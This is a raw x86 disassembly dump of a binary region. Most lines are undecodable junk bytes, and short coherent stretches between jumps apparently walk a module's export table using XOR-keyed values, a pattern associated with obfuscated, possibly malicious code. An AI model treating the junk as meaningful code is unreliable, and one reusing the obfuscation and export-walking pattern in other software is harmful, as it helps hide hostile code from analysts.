  40aeaf:	add    eax,0xe35e6b36
  40aeb4:	mov    al,ds:0x86b80fa3
  40aeb9:	jge    0x40ae5d
  40aebb:	sbb    eax,0xf50efd23
  40aec0:	sar    bl,0xa5
  40aec3:	push   ds
  40aec4:	dec    ebp
  40aec5:	fsub   st(2),st
  40aec7:	or     ebx,DWORD PTR [ebx]
  40aec9:	(bad)  
  40aeca:	sahf   
  40aecb:	ficomp WORD PTR [ecx-0x2]
  40aece:	mov    edi,0x888089e3
  40aed3:	fist   DWORD PTR [esp+edx*8]
  40aed6:	push   ss
  40aed7:	popf   
  40aed8:	push   esi
  40aed9:	out    0xc4,eax
  40aedb:	mov    edx,0x9890d49b
  40aee0:	outs   dx,DWORD PTR ds:[esi]
  40aee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aee2:	dec    ebx
  40aee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aee4:	test   al,0xe5
  40aee6:	pop    es
  40aee7:	mov    ecx,ecx
  40aee9:	cdq    
  40aeea:	jbe    0x40ae77
  40aeec:	dec    ebp
  40aeed:	or     al,0x33
  40aeef:	(bad)  
  40aef0:	lea    eax,[eax+eax*1+0x32729c]
  40aef7:	xor    ecx,esi
  40aef9:	sub    ecx,eax
  40aefb:	mov    ax,WORD PTR [ebp-0x4]
  40aeff:	movzx  eax,ax
  40af02:	cmp    eax,ecx
  40af04:	mov    eax,DWORD PTR [ebp-0x14]
  40af07:	movzx  ecx,WORD PTR [ebp-0x4]
  40af0b:	jg     0x40af20
  40af11:	xor    eax,esi
  40af13:	sub    ecx,eax
  40af15:	sub    ecx,edi
  40af17:	mov    WORD PTR [ebp-0x4],cx
  40af1b:	jmp    0x40af2d
  40af20:	xor    eax,esi
  40af22:	lea    eax,[eax+ecx*1+0x32729c]
  40af29:	mov    WORD PTR [ebp-0x4],ax
  40af2d:	mov    eax,DWORD PTR [ebp-0xc]
  40af30:	cmp    eax,ebx
  40af32:	je     0x40af46
  40af38:	mov    eax,DWORD PTR [ebp-0x8]
  40af3b:	mov    DWORD PTR [eax],0x60341e89
  40af41:	jmp    0x40bbf5
  40af46:	mov    eax,DWORD PTR [ebp+0x8]
  40af49:	mov    ecx,DWORD PTR [ebp-0x8]
  40af4c:	xor    eax,esi
  40af4e:	add    eax,edi
  40af50:	cmp    DWORD PTR [ecx],eax
  40af52:	je     0x40ba25
  40af58:	jmp    0x40b110
  40af5d:	icebp  
  40af5e:	in     eax,dx
  40af5f:	popf   
  40af60:	adc    BYTE PTR [ecx+0xcf17160],ah
  40af66:	xchg   esi,eax
  40af67:	cld    
  40af68:	ins    DWORD PTR es:[edi],dx
  40af69:	cs jl  0x40afab
  40af6c:	jns    0x40afb4
  40af6e:	jmp    0x7070:0x7f957070
  40af75:	mov    esi,0xeb7565bf
  40af7a:	dec    edi
  40af7b:	cmp    al,0xc0
  40af7d:	test   eax,0x529b738d
  40af82:	xchg   ebp,eax
  40af83:	sbb    bl,BYTE PTR [esi]
  40af85:	jle    0x40af3e
  40af87:	arpl   WORD PTR [edi-0x39eb23ab],si
  40af8d:	mov    edx,0x98d04f66
  40af92:	mov    ah,0x69
  40af94:	jmp    0x5125:0x48be5cc9
  40af9b:	push   edi
  40af9c:	idiv   DWORD PTR [edi]
  40af9e:	mov    ch,0xc9
  40afa0:	add    bh,ch
  40afa2:	loop   0x40af9c
  40afa4:	dec    ecx
  40afa5:	leave  
  40afa6:	shr    ch,0x1c
  40afa9:	clc    
  40afaa:	push   esp
  40afab:	xchg   esp,eax
  40afac:	scas   eax,DWORD PTR es:[edi]
  40afad:	mov    ds:0x81c3d3,eax
  40afb2:	sub    DWORD PTR [ecx],ecx
  40afb4:	lock jge 0x40afd8
  40afb7:	dec    esp
  40afb8:	pop    eax
  40afb9:	mov    BYTE PTR [ebx-0xf564333],ch
  40afbf:	(bad)  
  40afc0:	xchg   ebx,eax
  40afc1:	adc    eax,edi
  40afc3:	jmp    FWORD PTR [eax-0x5]
  40afc6:	jns    0x40afc5
  40afc8:	mov    esp,0x3f3f289e
  40afcd:	dec    ebx
  40afce:	push   esi
  40afcf:	and    DWORD PTR [edi-0x1a29046f],0x117cfb39
  40afd9:	in     eax,0x4c
  40afdb:	xchg   bl,dl
  40afdd:	sbb    al,0xdd
  40afdf:	jmp    0x7cae:0x5aadfc5f
  40afe6:	jg     0x40afdf
  40afe8:	stc    
  40afe9:	jecxz  0x40afba
  40afeb:	pop    ds
  40afec:	les    esp,FWORD PTR [eax+0x270776c6]
  40aff2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aff3:	sub    al,0x3d
  40aff5:	icebp  
  40aff6:	icebp  
  40aff7:	and    al,0x6f
  40aff9:	xor    eax,0x53542454
  40affe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afff:	and    esp,edi
  40b001:	push   eax
  40b002:	adc    ah,BYTE PTR [ecx]
  40b004:	shr    BYTE PTR ds:0x93d6f356,cl
  40b00a:	sbb    al,0x9c
  40b00c:	test   BYTE PTR [esi-0x6dbbf0a3],dh
  40b012:	mov    bl,0x18
  40b014:	and    al,0x83
  40b017:	sub    eax,0x68f463b0
  40b01c:	fidiv  DWORD PTR [ecx-0x76]
  40b01f:	aas    
  40b020:	push   ds
  40b021:	cs out dx,eax
  40b023:	dec    ebp
  40b024:	outs   dx,BYTE PTR ds:[esi]
  40b025:	add    DWORD PTR [ebx],ebp
  40b027:	adc    edi,DWORD PTR [ecx-0x15c1cc36]
  40b02d:	cli    
  40b02e:	push   0x25
  40b030:	and    BYTE PTR [ecx],ah
  40b032:	shl    BYTE PTR [ebp+0x61e25a76],1
  40b038:	(bad)  
  40b039:	inc    esi
  40b03a:	jp     0x40b02b
  40b03c:	retf   
  40b03d:	lar    edi,WORD PTR [edx+0x7]
  40b041:	stos   BYTE PTR es:[edi],al
  40b042:	pop    esp
  40b043:	call   0xae064021
  40b048:	fstp   TBYTE PTR [ebx-0x52]
  40b04b:	jmp    0x6c55:0x35b8e82a
  40b052:	mov    esi,0x9673a2a6
  40b057:	push   esi
  40b058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b059:	aad    0x33
  40b05b:	shr    ebp,1
  40b05d:	sahf   
  40b05e:	push   ebp
  40b05f:	jbe    0x40b0d3
  40b061:	pop    ecx
  40b062:	dec    ebp
  40b063:	mov    edi,0x53fb4cc
  40b068:	ins    BYTE PTR es:[edi],dx
  40b069:	pshufw mm4,QWORD PTR [eax+edi*4-0x46f93d9],0x6d
  40b072:	inc    edi
  40b073:	mov    edx,0xdec3f113
  40b078:	into   
  40b079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b07a:	ret    
  40b07b:	mov    esi,0x53dce36a
  40b080:	jnp    0x40b0fd
  40b082:	push   ds
  40b083:	or     dh,al
  40b085:	pop    edx
  40b086:	in     eax,dx
  40b087:	mov    al,0xf8
  40b089:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b08a:	inc    edx
  40b08b:	or     DWORD PTR [esi+ebx*8+0x2ca29341],0xa1224618
  40b096:	mov    ah,0x90
  40b098:	mov    dl,0x6c
  40b09a:	jb     0x40b02a
  40b09c:	pop    ds
  40b09d:	sub    DWORD PTR [ecx],ecx
  40b09f:	popa   
  40b0a0:	jmp    0x40b078
  40b0a2:	push   0xd45ed2c0
  40b0a7:	lods   al,BYTE PTR ds:[esi]
  40b0a8:	push   ebp
  40b0a9:	dec    esi
  40b0aa:	stos   BYTE PTR es:[edi],al
  40b0ab:	frstor [esp+edi*4+0x8]
  40b0af:	jb     0x40b038
  40b0b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0b2:	inc    edx
  40b0b3:	pop    ecx
  40b0b4:	adc    al,0x36
  40b0b6:	dec    ebp
  40b0b7:	leave  
  40b0b8:	pop    eax
  40b0b9:	outs   dx,DWORD PTR ds:[esi]
  40b0ba:	mov    al,0xf3
  40b0bc:	imul   ecx,DWORD PTR [ebx-0x5e],0x42
  40b0c0:	test   DWORD PTR [ebx-0x4c],eax
  40b0c3:	and    BYTE PTR [eax-0x582d4aab],al
  40b0c9:	ds ffree st(7)
  40b0cc:	pop    DWORD PTR [eax+eiz*4]
  40b0cf:	jg     0x40b0e3
  40b0d1:	add    bh,cl
  40b0d3:	and    BYTE PTR [eax-0x7f7522fb],cl
  40b0d9:	pop    ebx
  40b0da:	cmovb  eax,DWORD PTR [ebp+eiz*8+0x73]
  40b0df:	pop    eax
  40b0e0:	mov    edi,0x12b605f7
  40b0e5:	xchg   dl,bl
  40b0e7:	adc    DWORD PTR [edi],eax
  40b0e9:	jle    0x40b070
  40b0eb:	imul   ebx,DWORD PTR [ecx],0xffffffa8
  40b0ee:	enter  0x81d2,0x7d
  40b0f2:	(bad)  
  40b0f3:	in     eax,0xf6
  40b0f5:	cwde   
  40b0f6:	xlat   BYTE PTR ds:[ebx]
  40b0f7:	and    eax,0x7f219256
  40b0fc:	xchg   edx,eax
  40b0fd:	dec    ebp
  40b0fe:	mov    eax,0xd69140f
  40b103:	(bad)  [ebp+0x59a75ff3]
  40b109:	xchg   ebp,eax
  40b10a:	sub    eax,0x8f6c6fb3
  40b10f:	cdq    
  40b110:	mov    ecx,DWORD PTR [ebp-0x18]
  40b113:	mov    eax,DWORD PTR [ebp-0x8]
  40b116:	mov    eax,DWORD PTR [eax]
  40b118:	mov    eax,DWORD PTR [eax+0x3c]
  40b11b:	lea    ecx,[ecx*8+0x78]
  40b122:	add    eax,ecx
  40b124:	mov    ecx,DWORD PTR [ebp-0x8]
  40b127:	mov    ecx,DWORD PTR [ecx]
  40b129:	mov    eax,DWORD PTR [eax+ecx*1]
  40b12c:	mov    DWORD PTR [ebp-0x20],eax
  40b12f:	mov    eax,DWORD PTR [ebp+0x8]
  40b132:	xor    eax,esi
  40b134:	add    eax,edi
  40b136:	jmp    0x40b2ee
  40b13b:	iret   
  40b13c:	dec    edi
  40b13d:	mov    bl,0xfe
  40b13f:	mov    bl,0x62
  40b141:	icebp  
  40b142:	dec    ebp
  40b143:	dec    edx
  40b144:	int    0xfa
  40b146:	dec    ebp
  40b147:	bound  edi,QWORD PTR [edx]
  40b149:	sub    al,0xe9
  40b14b:	fucomi st,st(0)
  40b14d:	jo     0x40b1bf
  40b14f:	xchg   ebp,eax
  40b150:	jg     0x40b1c2
  40b152:	jo     0x40b16c
  40b154:	mov    ebx,0x1c8654d3
  40b159:	add    eax,0xd39ec63f
  40b15e:	sub    DWORD PTR [ecx+ecx*8-0x5d],edi
  40b162:	in     eax,dx
  40b163:	leave  
  40b164:	je     0x40b1c7
  40b166:	jno    0x40b147
  40b168:	pop    eax
  40b169:	retf   0xd052
  40b16c:	and    ecx,DWORD PTR [esi+0x4]
  40b16f:	stos   BYTE PTR es:[edi],al
  40b170:	push   eax
  40b171:	sbb    eax,0xf26b6b23
  40b176:	and    eax,0x1ed056ca
  40b17b:	scas   eax,DWORD PTR es:[edi]
  40b17c:	jnp    0x40b1e4
  40b17e:	popa   
  40b17f:	mov    ecx,0x99c2d5a8
  40b184:	and    eax,0xda46885a
  40b189:	loopne 0x40b148
  40b18b:	push   ebp
  40b18c:	jl     0x40b14f
  40b18e:	xchg   esi,eax
  40b18f:	mov    cs,WORD PTR [edi-0x79]
  40b192:	pop    ebx
  40b193:	arpl   WORD PTR [eax-0x70],di
  40b196:	fidivr DWORD PTR [esi-0x23]
  40b199:	push   ebp
  40b19a:	add    ah,dl
  40b19c:	dec    esi
  40b19d:	(bad)  
  40b19e:	and    ebp,edi
  40b1a0:	repz (bad) 
  40b1a2:	xlat   BYTE PTR ds:[ebx]
  40b1a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a4:	mov    esi,0xab440ebb
  40b1a9:	das    
  40b1aa:	fbld   TBYTE PTR [edx+eiz*1-0x73b8a40d]
  40b1b1:	aaa    
  40b1b2:	sbb    WORD PTR [ebp*1-0x75522fc1],ax
  40b1ba:	arpl   WORD PTR [eax+0xe],ax
  40b1bd:	cmp    DWORD PTR [eax-0x34],esi
  40b1c0:	call   0xff603032
  40b1c5:	ins    DWORD PTR es:[edi],dx
  40b1c6:	cmp    esp,DWORD PTR [eax-0x16]
  40b1c9:	shl    BYTE PTR ss:[ebx],0xad
  40b1cd:	rcl    DWORD PTR [ebp+eiz*8-0x3c962f01],cl
  40b1d4:	sbb    cl,BYTE PTR [edi+0x7cb19740]
  40b1da:	inc    edx
  40b1db:	xor    ah,BYTE PTR [edi+edx*2-0xf5e7866]
  40b1e2:	test   BYTE PTR [ebx-0x3c],ah
  40b1e5:	cld    
  40b1e6:	or     BYTE PTR [edi],bh
  40b1e8:	mov    ebp,0xb9db1842
  40b1ed:	xchg   edi,eax
  40b1ee:	and    BYTE PTR [ebx-0x11],ch
  40b1f1:	fwait
  40b1f2:	jecxz  0x40b23b
  40b1f4:	xchg   esp,eax
  40b1f5:	int3   
  40b1f6:	sbb    ecx,DWORD PTR [ebx+ecx*4-0x36b66a5a]
  40b1fd:	pop    ebp
  40b1fe:	push   eax
  40b1ff:	cwde   
  40b200:	mov    esp,0x3e7af87d
  40b205:	mov    ah,0x6e
  40b207:	mov    ecx,0xcb316cd3
  40b20c:	out    0xd6,eax
  40b20e:	xor    al,0x74
  40b210:	jg     0x40b1ce
  40b212:	outs   dx,DWORD PTR ds:[esi]
  40b213:	pop    es
  40b214:	(bad)  
  40b215:	addr16 and dl,cl
  40b218:	xchg   ebx,eax
  40b219:	inc    ebx
  40b21a:	outs   dx,BYTE PTR ds:[esi]
  40b21b:	xor    ch,BYTE PTR [edi+esi*4+0x4cd81160]
  40b222:	pop    edi
  40b223:	jns    0x40b1a6
  40b225:	cwde   
  40b226:	js     0x40b22a
  40b228:	cmp    al,0xd1
  40b22a:	push   es
  40b22b:	iret   
  40b22c:	pop    esi
  40b22d:	pop    ebp
  40b22e:	xchg   ecx,eax
  40b22f:	int3   
  40b230:	inc    ebp
  40b231:	into   
  40b232:	mov    ecx,0xa3dbf988
  40b237:	js     0x40b22e
  40b239:	inc    ebx
  40b23a:	fcom   DWORD PTR [edx+ebp*4+0x38]
  40b23e:	fwait
  40b23f:	push   esi
  40b240:	push   esp
  40b241:	retf   
  40b242:	leave  
  40b243:	pop    ebp
  40b244:	nop
  40b245:	xor    eax,DWORD PTR ds:[edx+ebp*8]
  40b249:	mov    edx,0x7bfd6c17
  40b24e:	retf   0x21e9
  40b251:	adc    DWORD PTR [ebx+0x6e],eax
  40b254:	mov    edx,0x525f334e
  40b259:	lods   eax,DWORD PTR ds:[esi]
  40b25a:	popa   
  40b25b:	xchg   esp,eax
  40b25c:	call   0xa0e48b26
  40b261:	mov    ecx,0x47840c85
  40b266:	or     eax,0x2a72d26a
  40b26b:	sub    eax,0x66337750
  40b270:	dec    ebx
  40b271:	cdq    
  40b272:	and    BYTE PTR [ebx],ah
  40b274:	jae    0x40b2d1
  40b276:	xchg   ebx,eax
  40b277:	sbb    DWORD PTR [ecx],eax
  40b279:	(bad)  
  40b27a:	or     DWORD PTR [edx+0x2f],ebx
  40b27d:	push   ebx
  40b27e:	push   ds
  40b27f:	cmc    
  40b280:	inc    ebp
  40b281:	add    ch,bl
  40b283:	pop    edi
  40b284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b285:	in     al,dx
  40b286:	or     BYTE PTR [esp-0x25422189],bl
  40b28d:	nop
  40b28e:	push   ebx
  40b28f:	test   al,0x3c
  40b291:	sub    eax,0x60a85f5c
  40b296:	pop    edi
  40b297:	cvtdq2ps xmm1,XMMWORD PTR [edx+ecx*4+0x76]
  40b29c:	mov    WORD PTR [edi-0x50],ds
  40b29f:	mov    cl,0xc
  40b2a1:	jbe    0x40b224
  40b2a3:	sub    bl,dl
  40b2a5:	in     al,dx
  40b2a6:	adc    ecx,ecx
  40b2a8:	mov    ds:0x1e20c34f,eax
  40b2ad:	pop    ss
  40b2ae:	call   0xc0958b33
  40b2b3:	inc    esi
  40b2b4:	jae    0x40b2a1
  40b2b6:	fdivr  QWORD PTR [edi]
  40b2b8:	rcl    ebp,0xf6
  40b2bb:	dec    esi
  40b2bc:	add    al,0x2f
  40b2be:	or     al,0xca
  40b2c0:	imul   esi,ebx,0x80cbacb0
  40b2c6:	xchg   ebp,eax
  40b2c7:	jge    0x40b287
  40b2c9:	jns    0x7b5118af
  40b2cf:	inc    ebx
  40b2d0:	ret    
  40b2d1:	dec    esi
  40b2d2:	jae    0x40b2c4
  40b2d4:	adc    BYTE PTR [eax+0x4436b646],0x1d
  40b2db:	stos   BYTE PTR es:[edi],al
  40b2dc:	dec    edi
  40b2dd:	mov    al,ds:0x53f973d4
  40b2e2:	mov    ebp,0xfb0e1f4
  40b2e7:	adc    eax,0x990ccc28
  40b2ec:	les    eax,FWORD PTR [ebp-0x1623ba77]
  40b2f2:	mov    bl,0x1
  40b2f4:	add    BYTE PTR [eax],al
  40b2f6:	mov    cl,0x4
  40b2f8:	icebp  
  40b2f9:	in     al,0x71
  40b2fb:	icebp  
  40b2fc:	mov    cl,0x51
  40b2fe:	push   0xa6dbadc9
  40b303:	in     eax,dx
  40b304:	(bad)
  40b307:	div    BYTE PTR [eax+0x70]
  40b30a:	xchg   ebp,eax
  40b30b:	jg     0x40b37d
  40b30d:	jo     0x40b37c
  40b30f:	add    al,ch
  40b311:	mov    edi,0x16c3b9b5
  40b316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b317:	jne    0x40b2df
  40b319:	sub    DWORD PTR ds:0x5d713455,edx
  40b31f:	jg     0x4f6ca4aa
  40b325:	stos   BYTE PTR es:[edi],al
  40b326:	xchg   cl,dl
  40b328:	shl    DWORD PTR [ecx],1
  40b32a:	fldl2t 
  40b32c:	cs out dx,al
  40b32e:	imul   BYTE PTR [eax+ecx*2+0x19e531f7]
  40b335:	or     DWORD PTR [edx+0x8b3efd7],ebx
  40b33b:	test   BYTE PTR [edi+ebp*4],0xca
  40b33f:	hlt    
  40b340:	xchg   DWORD PTR [esi-0x5ecbc401],esi
  40b346:	(bad)  
  40b347:	aas    
  40b348:	and    ecx,eax
  40b34a:	adc    eax,eax
  40b34c:	out    dx,eax
  40b34d:	dec    eax
  40b34e:	add    cl,cl
  40b350:	jmp    0x516dd23c
  40b355:	inc    eax
  40b356:	inc    esp
  40b357:	pop    esi
  40b358:	jae    0x40b3cc
  40b35a:	retf   
  40b35b:	and    eax,0x6ee4148a
  40b360:	mov    WORD PTR [ecx],ds
  40b362:	dec    esp
  40b363:	adc    BYTE PTR [edi+ecx*2+0x4f9cf0f7],bh
  40b36a:	dec    ebp
  40b36b:	gs aas 
  40b36d:	ror    BYTE PTR [eax-0x5748d04b],cl
  40b373:	push   eax
  40b374:	out    dx,al
  40b375:	jmp    0x40b3de
  40b377:	lods   al,BYTE PTR ds:[esi]
  40b378:	sbb    eax,0x37fe5e8d
  40b37d:	mov    al,ds:0x3a59c875
  40b382:	pop    es
  40b383:	inc    ebp
  40b384:	and    al,0xd2
  40b386:	cmp    DWORD PTR [ecx+0x2486cb4b],eax
  40b38c:	scas   al,BYTE PTR es:[edi]
  40b38d:	sahf   
  40b38e:	sbb    al,0xef
  40b390:	sbb    esi,eax
  40b392:	lods   eax,DWORD PTR ds:[esi]
  40b393:	dec    esi
  40b394:	arpl   WORD PTR [ebp+0xe],dx
  40b397:	mov    ebx,0x6ecb2a4b
  40b39c:	ret    
  40b39d:	push   esp
  40b39e:	aaa    
  40b39f:	dec    ebx
  40b3a0:	mov    bh,BYTE PTR [ecx-0x52]
  40b3a3:	push   edx
  40b3a4:	sbb    al,0xc8
  40b3a6:	int3   
  40b3a7:	test   al,0x9f
  40b3a9:	ins    DWORD PTR es:[edi],dx
  40b3aa:	adc    BYTE PTR [edx+0x63a491c5],dh
  40b3b0:	pop    ebp
  40b3b1:	sub    eax,0xed95cc7b
  40b3b6:	mov    DWORD PTR [ebx+0x28],esi
  40b3b9:	cld    
  40b3ba:	outs   dx,BYTE PTR ds:[esi]
  40b3bb:	add    dl,BYTE PTR [bx+si+0xc]
  40b3bf:	dec    eax
  40b3c0:	(bad)  
  40b3c2:	xchg   edx,eax
  40b3c3:	into   
  40b3c4:	pop    ecx
  40b3c5:	movhps QWORD PTR [ebx+ebx*8],xmm4
  40b3c9:	scas   eax,DWORD PTR es:[edi]
  40b3ca:	dec    eax
  40b3cb:	inc    ebx
  40b3cc:	fs sahf 
  40b3ce:	int    0x2a
  40b3d0:	pop    esp
  40b3d1:	jg     0x40b44a
  40b3d3:	push   esi
  40b3d4:	loope  0x40b3bd
  40b3d6:	mov    al,ds:0xe11c90d5
  40b3db:	add    eax,0x27f7d3de
  40b3e0:	cli    
  40b3e1:	cmp    eax,0xc41550d5
  40b3e6:	mov    ebx,0xa874a09f
  40b3eb:	xor    BYTE PTR [edi],ch
  40b3ed:	outs   dx,BYTE PTR ds:[esi]
  40b3ee:	pop    es
  40b3ef:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3f1:	das    
  40b3f2:	les    ecx,FWORD PTR [ebp-0x7f1ba96a]
  40b3f8:	pop    ds
  40b3f9:	aaa    
  40b3fa:	mov    esp,0x214421d8
  40b3ff:	es or  al,0xd5
  40b402:	outs   dx,DWORD PTR ds:[esi]
  40b403:	loop   0x40b3ec
  40b405:	pop    ds
  40b406:	push   edx
  40b407:	cdq    
  40b408:	push   ebp
  40b409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b40a:	sti    
  40b40b:	inc    edi
  40b40c:	or     BYTE PTR [ecx+0x7e04e35c],dl
  40b412:	add    al,0xa5
  40b414:	add    DWORD PTR ds:0xa758405e,0xffffffe3
  40b41b:	clc    
  40b41c:	mov    ch,0x52
  40b41e:	in     al,dx
  40b41f:	mov    bh,0x3b
  40b421:	stos   DWORD PTR es:[edi],eax
  40b422:	fild   QWORD PTR [ecx]
  40b424:	jge    0x40b400
  40b426:	and    eax,0x6f455b47
  40b42c:	outs   dx,BYTE PTR ds:[esi]
  40b42d:	jnp    0x40b442
  40b42f:	mov    eax,ds:0x6b79c98f
  40b434:	retf   
  40b435:	xchg   ebx,eax
  40b436:	int    0x79
  40b438:	cli    
  40b439:	xchg   ebx,eax
  40b43a:	and    bh,BYTE PTR [esi]
  40b43c:	mov    eax,?
  40b43e:	test   bh,cl
  40b440:	cmp    esp,DWORD PTR ds:0x6f75453
  40b446:	mov    ebx,0xcf7c8152
  40b44b:	xchg   BYTE PTR [eax-0x397f6f6e],al
  40b451:	or     DWORD PTR [edx+esi*8-0x11],edx
  40b455:	mov    ebp,0xa238bde
  40b45a:	xchg   ebx,eax
  40b45b:	xchg   edi,eax
  40b45c:	sbb    eax,0x3830b769
  40b461:	out    0xa0,al
  40b463:	enter  0xfba2,0xc7
  40b467:	cli    
  40b468:	iret   
  40b469:	sar    DWORD PTR [edi],cl
  40b46b:	mov    bh,0xb4
  40b46d:	mov    al,0x20
  40b46f:	fidiv  DWORD PTR [eax+0x52]
  40b472:	lods   al,BYTE PTR ds:[esi]
  40b473:	jl     0x40b4c3
  40b475:	mov    ds:0xe64ce067,eax
  40b47a:	mov    cs,WORD PTR [eax+0x7b]
  40b47d:	ja     0x40b406
  40b47f:	ds call 0xda9b:0x6d9dd54b
  40b487:	mul    DWORD PTR [eax+0x1e37c81a]
  40b48d:	inc    edx
  40b48e:	mov    ds:0x94dfc259,al
  40b493:	loopne 0x40b429
  40b495:	xchg   BYTE PTR [esi],bh
  40b497:	push   ss
  40b498:	dec    esp
  40b499:	in     al,0xcd
  40b49b:	popa   
  40b49c:	dec    edi
  40b49d:	sub    edx,esp
  40b49f:	test   eax,0x1c86806
  40b4a4:	mov    dh,0x2e
  40b4a6:	push   ebp
  40b4a7:	clc    
  40b4a8:	xchg   DWORD PTR [ebx+0x4d8b0845],ecx
  40b4ae:	loopne 0x40b4e3
  40b4b0:	mov    BYTE PTR [ebx],0xc7
  40b4b3:	cmp    ecx,eax
  40b4b5:	je     0x40bbf5
  40b4bb:	mov    eax,DWORD PTR [ebp-0x8]
  40b4be:	mov    ecx,DWORD PTR [ebp-0x20]
  40b4c1:	add    ecx,DWORD PTR [eax]
  40b4c3:	mov    DWORD PTR [ebp-0x24],ecx
  40b4c6:	mov    eax,DWORD PTR [ebp-0x24]
  40b4c9:	mov    ecx,DWORD PTR [ebp-0x8]
  40b4cc:	jmp    0x40b684
  40b4d1:	dec    ecx
  40b4d2:	push   ss
  40b4d3:	sub    al,BYTE PTR ds:[ecx-0xe]
  40b4d7:	imul   esi,DWORD PTR [ebp+0x77],0x5f413075
  40b4de:	icebp  
  40b4df:	std    
  40b4e0:	jl     0x40b477
  40b4e2:	cmc    
  40b4e3:	jo     0x40b555
  40b4e5:	xchg   ebp,eax
  40b4e6:	jg     0x40b558
  40b4e8:	jo     0x40b53a
  40b4ea:	cmc    
  40b4eb:	idiv   BYTE PTR [ebx-0x74517c44]
  40b4f1:	xor    bl,BYTE PTR [ecx-0xf]
  40b4f4:	push   edi
  40b4f5:	fwait
  40b4f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4f7:	icebp  
  40b4f8:	mov    ebp,fs
  40b4fa:	sbb    eax,0x354c4c31
  40b4ff:	push   edx
  40b500:	pushf  
  40b501:	xchg   edi,eax
  40b502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b503:	mov    ds:0xb9a9ef04,al
  40b508:	sbb    BYTE PTR [esi],al
  40b50a:	or     BYTE PTR [edi],bl
  40b50c:	mov    ebp,0x79d57212
  40b511:	push   edx
  40b512:	jmp    0x40b522
  40b514:	rol    DWORD PTR [ebp+0x31],cl
  40b517:	(bad)  
  40b518:	popf   
  40b519:	jne    0x40b4d8
  40b51b:	and    bl,0x42
  40b51e:	mov    dh,0x24
  40b520:	xor    BYTE PTR [ebx-0x49774df],dl
  40b526:	jle    0x40b592
  40b528:	push   esp
  40b529:	mov    eax,ds:0xfba94ea8
  40b52e:	push   esi
  40b52f:	push   cs
  40b530:	retf   
  40b531:	adc    eax,DWORD PTR [edi+0x15b9b6da]
  40b537:	test   eax,edi
  40b539:	enter  0x82df,0xf3
  40b53d:	pop    ds
  40b53e:	jo     0x40b58a
  40b540:	push   edi
  40b541:	(bad)  
  40b542:	dec    ebx
  40b544:	and    cl,0xbc
  40b547:	fwait
  40b548:	ror    BYTE PTR [edx+0x4e4dc3a1],1
  40b54e:	jg     0x40b5bf
  40b550:	dec    esp
  40b551:	out    0x99,al
  40b553:	inc    ecx
  40b554:	xor    eax,0xd89fcb8b
  40b559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b55a:	fst    QWORD PTR [ebx]
  40b55c:	adc    ebx,edx
  40b55e:	pop    ds
  40b55f:	fs fcmovnu st,st(4)
  40b562:	test   DWORD PTR [ebp+0x167d9ec4],0xa2edea4d
  40b56c:	daa    
  40b56d:	mov    WORD PTR [esi],fs
  40b56f:	and    eax,edx
  40b571:	fsub   QWORD PTR [esi-0x6eb86a91]
  40b577:	dec    esi
  40b578:	outs   dx,BYTE PTR ds:[esi]
  40b579:	inc    edi
  40b57a:	cmp    al,0x4b
  40b57c:	dec    ebp
  40b57d:	dec    edi
  40b57e:	(bad)  
  40b57f:	test   eax,0x7d112c5e
  40b584:	mov    eax,?
  40b586:	jb     0x40b5fc
  40b588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b589:	hlt    
  40b58a:	mov    eax,ds:0xc4a61fc5
  40b58f:	mov    bl,0x90
  40b591:	shl    BYTE PTR [edx],cl
  40b593:	hlt    
  40b594:	shl    ebx,0x65
  40b597:	push   0xffffffc6
  40b599:	sar    BYTE PTR [edx],cl
  40b59b:	imul   esp,DWORD PTR [edx-0x4d],0x18
  40b59f:	push   ecx
  40b5a0:	and    al,0xa2
  40b5a2:	xor    eax,0xfd540bd
  40b5a7:	push   cs
  40b5a8:	mov    edi,0xcc1eba45
  40b5ad:	les    esp,FWORD PTR [ebx+ecx*4-0x4f4ccf6f]
  40b5b4:	retf   0xc6a0
  40b5b7:	push   esi
  40b5b8:	xor    eax,0x11c36e79
  40b5bd:	cmc    
  40b5be:	retf   0xb36e
  40b5c1:	nop
  40b5c2:	js     0x40b5f9
  40b5c4:	or     al,0x7a
  40b5c6:	push   edi
  40b5c7:	mov    ah,0x2c
  40b5c9:	xor    bl,dh
  40b5cb:	push   edi
  40b5cc:	jle    0x40b5c6
  40b5ce:	pop    esi
  40b5cf:	xlat   BYTE PTR ds:[ebx]
  40b5d0:	jle    0x40b5b5
  40b5d2:	rol    BYTE PTR [eax-0x5a],1
  40b5d5:	xchg   DWORD PTR [esi+0x7a],eax
  40b5d8:	shl    ah,1
  40b5da:	rol    BYTE PTR [edx+0xe],cl
  40b5dd:	aas    
  40b5de:	scas   al,BYTE PTR es:[edi]
  40b5df:	daa    
  40b5e0:	mov    bl,0x1d
  40b5e2:	and    DWORD PTR [ecx+0x7b427075],ebx
  40b5e8:	sar    DWORD PTR [edx+ecx*4+0x4c],cl
  40b5ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ed:	push   ds
  40b5ee:	ror    DWORD PTR [ebx+0x6c4b8c7],0xc7
  40b5f5:	in     eax,0xed
  40b5f7:	inc    ebp
  40b5f8:	or     dx,si
  40b5fb:	daa    
  40b5fc:	pop    esp
  40b5fd:	mov    DWORD PTR [ebx+0x3b],edi
  40b600:	cmp    DWORD PTR gs:[ecx+esi*1-0x8],ecx
  40b605:	lea    ebp,[esi-0x24]
  40b608:	jb     0x40b646
  40b60a:	sbb    dh,BYTE PTR [eax]
  40b60c:	mov    cl,0x74
